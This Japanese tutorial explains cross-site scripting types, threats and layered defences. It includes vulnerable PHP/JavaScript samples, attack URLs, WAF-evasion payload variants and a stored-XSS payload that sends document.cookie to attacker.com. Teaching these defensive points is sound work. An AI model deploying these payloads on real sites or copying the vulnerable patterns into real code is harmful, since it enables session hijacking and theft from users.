## クロスサイトスクリプティング（XSS）解説

クロスサイトスクリプティング（XSS）は、Webアプリケーションの脆弱性を利用する代表的なサイバー攻撃の一つです。 攻撃者は、脆弱性のあるWebサイトに悪意のあるスクリプトを埋め込み、サイトを訪れたユーザーのブラウザ上でそのスクリプトを実行させます。 これにより、個人情報の窃取、Webサイトの改ざん、マルウェアへの感染など、様々な被害を引き起こす可能性があります。

情報処理推進機構（IPA）の報告によると、XSSは長年にわたり、ソフトウェアの脆弱性報告の中で常に上位を占める、非常に一般的かつ危険な脆弱性です。

本稿では、XSSの基本的な仕組みから、具体的な攻撃手法、そして実践的な対処法、さらには近年の動向までを網羅的に解説します。

### 1. クロスサイトスクリプティング（XSS）とは何か？

XSSは、Webアプリケーションが利用者からの入力データを適切に処理せず、そのままWebページに出力してしまうことが根本的な原因で発生します。 攻撃者は、この不備を悪用し、入力フォームやURLのパラメータなどに、JavaScriptのようなスクリプトを仕込みます。

Webアプリケーションがその入力値を「ただの文字列」としてではなく、「実行可能なスクリプト」として解釈してしまい、ユーザーのブラウザに送信します。 結果として、そのスクリプトは正規のWebサイトの一部としてユーザーのブラウザ上で実行されてしまいます。

このように、攻撃の起点となるサイトと、実際にスクリプトが実行されるサイトが異なる（サイトを横断＝クロスサイトする）ことから、この名前が付けられました。

> **なぜ「XSS」と略すのか？**
> 「Cross-Site Scripting」の頭文字を取ると「CSS」となりますが、これはスタイルシート言語である「Cascading Style Sheets」で既に使用されているため、混同を避けるために「Cross」を「X」に置き換えて「XSS」と表記されるのが一般的です。

### 2. XSSによって引き起こされる脅威

XSS攻撃が成功すると、ユーザーやサービス提供者に甚大な被害をもたらす可能性があります。

*   **セッションハイジャック（なりすまし）**: ユーザーのセッションIDが保存されたCookie情報を盗み出し、そのユーザーになりすましてWebサービスに不正ログインします。 これにより、登録情報の閲覧・改ざん、不正な商品購入、SNSでの意図しない投稿などが行われる可能性があります。
*   **フィッシング詐欺**: 正規のサイト上に偽のログインフォームや入力画面を表示させ、ユーザーID、パスワード、クレジットカード情報などの重要な個人情報を盗み取ります。 正規のドメイン上で表示されるため、ユーザーが偽物だと見破ることは非常に困難です。
*   **Webサイトの改ざん**: サイトの表示内容を書き換えたり、意図しない広告やわいせつな画像を表示させたりします。 企業の信頼性を著しく損なう可能性があります。
*   **マルウェア感染**: ユーザーを悪意のあるサイトへ強制的にリダイレクトさせたり、マルウェアをダウンロードさせたりします。
*   **キー入力の盗聴（キーロガー）**: ユーザーがキーボードで入力した内容をすべて攻撃者に送信するスクリプトを仕掛け、機密情報を盗み出します。

### 3. XSSの主要な種類

XSSは、攻撃の手法やスクリプトが埋め込まれる場所によって、主に3つの種類に分類されます。

#### 3.1. 反射型XSS (Reflected XSS)

反射型XSSは、最も基本的なタイプのXSSです。

**仕組み:**
1.  攻撃者は、悪意のあるスクリプトを含んだURLを作成し、メールやSNSなどを通じてユーザーにクリックさせようと誘導します。
2.  ユーザーがそのURLをクリックすると、スクリプトを含んだリクエストが脆弱性のあるWebサーバーに送信されます。
3.  サーバーは、URLに含まれたスクリプトをそのままレスポンスの一部としてHTMLに埋め込み、ユーザーのブラウザに返します（反射させます）。
4.  ユーザーのブラウザは、サーバーから送られてきた正規のコンテンツの一部として、悪意のあるスクリプトを実行してしまいます。

この攻撃は、細工されたURLをクリックした特定のユーザーのみが影響を受け、サーバー自体にスクリプトが保存されるわけではないため、「非持続型」とも呼ばれます。

**脆弱なコードの例（PHP）:**
検索結果を表示するページで、URLのクエリパラメータ `q` をそのまま画面に出力するような実装は危険です。

```php
// search.php
$query = $_GET['q'];
echo "検索結果: " . $query;
```

**攻撃URLの例:**
`http://example.com/search.php?q=<script>alert('XSS');</script>`

このURLにアクセスすると、`$query` の部分にスクリプトが埋め込まれ、ページ上で `alert('XSS');` が実行されてしまいます。

#### 3.2. 格納型XSS (Stored XSS)

格納型XSSは、反射型よりも広範囲に影響を及ぼす可能性があり、最も危険なタイプとされています。

**仕組み:**
1.  攻撃者は、掲示板、ブログのコメント欄、ユーザープロフィールなど、ユーザーが入力した内容を保存する機能を持つWebサイトに、悪意のあるスクリプトを書き込みます。
2.  Webアプリケーションは、そのスクリプトをデータベースなどのサーバー上に保存（格納）します。
3.  他のユーザーが、スクリプトが格納されたページ（例：掲示板のスレッド）にアクセスします。
4.  サーバーは、データベースからスクリプトを含んだデータを読み出し、HTMLに埋め込んでユーザーのブラウザに送信します。
5.  アクセスしたユーザーのブラウザは、ページを閲覧するだけで自動的に悪意のあるスクリプトを実行してしまいます。

この攻撃は、一度スクリプトが格納されると、そのページを閲覧した不特定多数のユーザーが被害に遭う可能性があるため、「持続型 (Persistent XSS)」とも呼ばれます。

**脆弱なコードの例（PHP & MySQL）:**
掲示板への投稿を無対策でデータベースに保存し、表示するような実装は危険です。

```php
// post.php (投稿処理)
$comment = $_POST['comment'];
// 脆弱な例: 入力値をそのままDBに保存
$stmt = $pdo->prepare("INSERT INTO comments (comment) VALUES (?)");
$stmt->execute([$comment]);

// view.php (表示処理)
$stmt = $pdo->query("SELECT comment FROM comments");
while ($row = $stmt->fetch()) {
    // 脆弱な例: DBから取り出した値をそのまま出力
    echo "<div>" . $row['comment'] . "</div>";
}
```

**攻撃に使われる入力値の例:**
コメント入力欄に以下の内容を投稿します。
`<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>`

この投稿が保存されると、この掲示板を閲覧したすべてのユーザーのCookie情報が、攻撃者のサーバーに送信されてしまいます。

#### 3.3. DOMベースXSS (DOM-based XSS)

DOMベースXSSは、サーバー側の処理とは無関係に、ユーザーのブラウザ（クライアントサイド）だけで完結する比較的新しいタイプのXSSです。

**仕組み:**
DOM (Document Object Model) とは、プログラム（特にJavaScript）がHTMLドキュメントの構造や内容を操作するための仕組みです。 DOMベースXSSは、このDOMを不正に操作することで攻撃が成立します。

1.  攻撃者は、URLのフラグメント（`#`以降の部分）などを利用して、悪意のあるスクリプトを含んだURLを作成し、ユーザーにクリックさせます。
2.  ユーザーがURLにアクセスすると、ページ内のJavaScriptが、URLのフラグメントなどから値を取得します。
3.  JavaScriptが、取得した値を適切に処理しないまま、`innerHTML` や `document.write` といったDOMを操作する関数・プロパティに渡してしまいます。
4.  DOMが書き換えられる過程で、悪意のあるスクリプトが実行されます。

この攻撃は、サーバーは正規のページを返すだけで、攻撃はすべてブラウザ上で完結するのが特徴です。 近年普及しているシングルページアプリケーション（SPA）など、クライアントサイドのJavaScriptで動的にページを構築するアプリケーションで特に問題となりやすいです。

**脆弱なコードの例（JavaScript）:**
URLのフラグメントを使って、ページに表示する名前を切り替えるような実装は危険です。

```html
<div id="welcome-message"></div>
<script>
    const name = decodeURIComponent(window.location.hash.substring(1));
    // 脆弱な例: innerHTMLに値をそのまま設定
    document.getElementById('welcome-message').innerHTML = "こんにちは、" + name + "さん";
</script>
```

**攻撃URLの例:**
`http://example.com/welcome.html#<img src=x onerror=alert('XSS')>`

このURLにアクセスすると、`name` 変数に `"<img src=x onerror=alert('XSS')>"` という文字列が入り、`innerHTML` によってHTMLとして解釈され、画像の読み込みエラーイベント（`onerror`）を利用してスクリプトが実行されてしまいます。

### 4. 具体的な攻撃手法とペイロードの例

XSS攻撃に用いられるスクリプト（ペイロード）は、単純なものから非常に巧妙なものまで多岐にわたります。

*   **基本的なスクリプトタグ**
    *   `<script>alert('XSS')</script>`
        *   最も古典的で、脆弱性の存在確認によく使われます。
*   **イベントハンドラを利用する手法**
    *   `<img src="invalid" onerror="alert('XSS')">`
        *   存在しない画像を読み込ませ、エラー時に`onerror`イベントでスクリプトを実行します。
    *   `<body onload="alert('XSS')">`
        *   ページの読み込み完了時にスクリプトを実行します。
*   **`javascript:` スキームを利用する手法**
    *   `<a href="javascript:alert('XSS')">クリックしてね</a>`
        *   ハイパーリンクの`href`属性に直接スクリプトを記述します。
*   **WAF（Web Application Firewall）を回避するための難読化**
    攻撃者は、セキュリティ製品による検知を逃れるため、ペイロードを難読化することがあります。
    *   **大文字・小文字の混在**: `<ScRiPt>alert('XSS')</ScRiPt>`
    *   **エンコーディング**:
        *   URLエンコード: `%3Cscript%3Ealert('XSS')%3C/script%3E`
        *   HTMLエンティティ: `&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;`
    *   **文字列操作**: `<script>eval('al' + 'ert(\'XSS\')')</script>`

### 5. 実践的な防御策・対処手順

XSSの被害を防ぐには、開発者、運用者、利用者それぞれが適切な対策を講じる必要があります。単一の対策で万全とは言えず、多層的な防御が重要です。

#### 5.1. 開発者向けの対策（根本的解決）

最も重要なのは、アプリケーション自体に脆弱性を作り込まないことです。

##### **a. エスケープ処理（サニタイジング）の徹底**

XSS対策の基本かつ最も重要な対策は、ユーザーからの入力値など、信頼できないデータをWebページに出力する際に、**必ずエスケープ処理を行う**ことです。 エスケープとは、HTMLにおいて特別な意味を持つ文字（例：`<`, `>`, `&`, `"`, `'`）を、意味を持たない安全な文字列（HTMLエンティティ）に置き換える処理です。

*   `<` → `&lt;`
*   `>` → `&gt;`
*   `&` → `&amp;`
*   `"` → `&quot;`
*   `'` → `&#39;`

この処理により、仮に `<script>` タグが入力されても、それは単なる文字列として表示されるだけで、スクリプトとして実行されることはありません。

**出力箇所に応じたエスケープ:**
エスケープの方法は、データを出力するコンテキスト（場所）によって異なります。

*   **HTML要素のテキストとして出力する場合**: 上記のHTMLエスケープを行います。
*   **HTML属性値として出力する場合**: HTMLエスケープに加え、属性値をダブルクォーテーションで囲むことが推奨されます。
*   **JavaScriptコード内に出力する場合**: JavaScriptの文字列リテラルとして安全に展開されるように、バックスラッシュ（`\`）でエスケープ処理を行います。
*   **URLパラメータとして出力する場合**: URLエンコーディング（パーセントエンコーディング）を適用します。

**フレームワークの利用:**
現代のWebフレームワーク（Ruby on Rails, Django, Laravel, React, Vue.jsなど）の多くは、デフォルトでXSS対策として自動的にエスケープ処理を行う機能が備わっています。 これらの機能を正しく利用することが、安全なアプリケーション開発の近道です。

##### **b. 入力値の検証（バリデーション）**

入力値に対して、期待されるフォーマットや文字種、長さに合致しているかを検証することも有効な対策です。 例えば、電話番号の入力欄には数字とハイフンのみを許可し、スクリプトタグのような特殊文字は受け付けないようにします。 このような「許可するものを定義する」ホワイトリスト方式が推奨されます。ただし、バリデーションはあくまで保険的な対策であり、エスケープ処理を省略する理由にはなりません。

##### **c. Content Security Policy (CSP) の導入**

CSPは、ブラウザが読み込んで実行できるリソース（スクリプト、スタイルシート、画像など）の提供元を、サーバー側がHTTPヘッダーで明示的に指定できる仕組みです。

**`Content-Security-Policy` ヘッダー例:**
`Content-Security-Policy: script-src 'self' https://trusted.cdn.com;`

この設定は、スクリプトの実行を「同一オリジン（`'self'`）」と「`https://trusted.cdn.com`」から提供されるものに限定します。これにより、たとえXSS脆弱性によって不正なスクリプトがページに挿入されたとしても、その実行をブラウザレベルで防ぐことができます。

##### **d. CookieへのHttpOnly属性の付与**

Cookieに`HttpOnly`属性を付与すると、そのCookieはサーバーとの通信でのみ使用され、JavaScriptからのアクセス（`document.cookie`）が禁止されます。これにより、XSS攻撃によってセッションIDを含んだCookieが盗まれる「セッションハイジャック」のリスクを大幅に軽減できます。

##### **e. 安全なAPIの利用とライブラリの選択**

`innerHTML` のような文字列からDOMを生成するAPIは、慎重に使用する必要があります。 代わりに `textContent` を使うなど、より安全なAPIを選択することが重要です。また、使用するJavaScriptライブラリやフレームワークは、セキュリティが十分に考慮されているかを確認し、常に最新の状態に保つことが求められます。

#### 5.2. 運用者・管理者向けの対策

##### **a. WAF (Web Application Firewall) の導入**

WAFは、Webアプリケーションへの通信を監視し、XSS攻撃などの不正なパターンを検知・ブロックするセキュリティ製品です。 既存のアプリケーションのコードを改修することなく、一定の防御効果が期待できます。ただし、WAFはシグネチャベースの検知が主であり、未知の攻撃や巧妙に難読化された攻撃はすり抜ける可能性があるため、WAFだけに頼るのは危険です。あくまで多層防御の一環と捉えるべきです。

##### **b. 脆弱性診断の定期的な実施**

自社のWebアプリケーションにXSS脆弱性が存在しないか、定期的に脆弱性診断を実施することが非常に重要です。 診断ツールによる自動スキャンと、セキュリティ専門家による手動診断を組み合わせることで、より高い精度で脆弱性を発見できます。

#### 5.3. 利用者向けの対策

利用者側でできる対策は限られていますが、リスクを低減するために以下の点を心がけることが推奨されます。

*   ブラウザやソフトウェアを常に最新の状態に保つ。
*   不審なメールやSNSに記載されたリンクを安易にクリックしない。
*   信頼できないWebサイトに個人情報を入力しない。

### 6. 近年のXSSの傾向と動向

XSSは古くからある攻撃ですが、Web技術の進化とともにその手口も巧妙化・多様化しています。

*   **シングルページアプリケーション（SPA）とDOMベースXSSの増加**: ReactやVue.jsといったJavaScriptフレームワークを用いたSPAの普及に伴い、サーバーサイドよりもクライアントサイドで処理が完結するDOMベースXSSの割合が増加しています。 フレームワークの設定不備や不適切なDOM操作が原因となるケースが目立ちます。
*   **mXSS (Mutation XSS) の登場**: `innerHTML` などで汚染されたHTML断片をDOMに挿入する際、ブラウザのHTMLパーサーがコードを「修正（Mutation）」する過程で、意図せず攻撃コードが生成されてしまうタイプのXSSです。 サニタイズ処理をすり抜ける可能性があり、非常に検知と対策が難しい攻撃手法です。
*   **JSONやAPIを介したXSS**: モダンなWebアプリケーションでは、データ交換形式としてJSONが多用されます。APIから受け取ったJSONデータを安全でない方法で画面に描画することで発生するXSSも増えています。
*   **PDFファイルを悪用したXSS**: PDFファイル内に埋め込まれたJavaScriptが実行されることでXSSにつながる脆弱性も報告されています。
*   **セキュリティ標準の進化（Trusted Types）**: DOMベースXSSを防ぐための新たなブラウザセキュリティ機能として「Trusted Types」が登場しました。 これは、`innerHTML`などの危険なDOM操作APIに、文字列を直接渡すことを禁止し、「信頼できる型（Trusted Type）」のオブジェクトしか受け付けなくする仕組みです。 これにより、意図しないスクリプト実行のリスクを根本から低減することが期待されています。

### 7. まとめ

クロスサイトスクリプティングは、Webアプリケーションにおける最も基本的かつ深刻な脆弱性の一つです。その本質は**「信頼できないデータを信頼し、無防備に実行してしまう」**ことにあります。

攻撃の手口は反射型、格納型、DOMベースなど多岐にわたり、セッションハイジャックやフィッシング詐欺など、深刻な被害につながります。

この脅威からWebサイトと利用者を守るためには、以下の多層的な対策が不可欠です。

1.  **根本対策（開発）**: 出力時のエスケープ処理を徹底し、安全なフレームワークやAPIを利用する。
2.  **保険的対策（開発・運用）**: Content Security Policy (CSP) やWAFを導入し、防御層を厚くする。
3.  **継続的な対策（運用）**: 定期的な脆弱性診断によって、新たな脆弱性の発生を検知し、迅速に修正する。

